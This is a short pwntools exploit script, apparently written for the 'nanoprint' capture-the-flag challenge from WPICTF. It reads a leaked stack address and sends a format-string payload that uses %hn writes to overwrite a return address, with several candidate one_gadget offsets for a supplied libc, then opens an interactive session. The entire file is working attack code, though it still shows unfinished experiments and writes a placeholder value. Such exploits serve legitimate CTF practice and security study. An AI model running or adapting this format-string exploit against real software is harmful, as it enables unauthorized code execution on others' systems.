from pwn import * 

#r = remote('dorsia3.wpictf.xyz', 31337)

r = process('./nanoprint', env={'LD_PRELOAD':'./libc.so.6'})
libc = ELF('./libc.so.6')

offset = 7

ret_offset = 0x71

one_gadget = 0x3d0d3
one_gadget = 0x3d0d5
one_gadget = 0x3d0e0
#one_gadget = 0x67a7f
#one_gadget = 0x67a80
#one_gadget = 0x137e5e
#one_gadget = 0x137e5f

leak = r.recvuntil('\n').strip()
write = int(leak[:10],16) + ret_offset

payload = "A"
payload += p32(write+2)
payload += p32(write)
payload += "%.{}x".format(0xbeef-8-1)
payload += "%{}$hn".format(offset+1)
payload += "%.{}x".format(0xdead-0xbeef)
payload += "%{}$hn".format(offset)
#payload += "%.{}x".format(0xdead-0xbeef)
#payload += "%{}$hn".format(offset)
#payload += fmtstr_payload(offset, {write: 0xdeadbeef}, write_size='int')
#payload += "A"*(69-len(payload))


r.sendline(payload)
r.interactive()


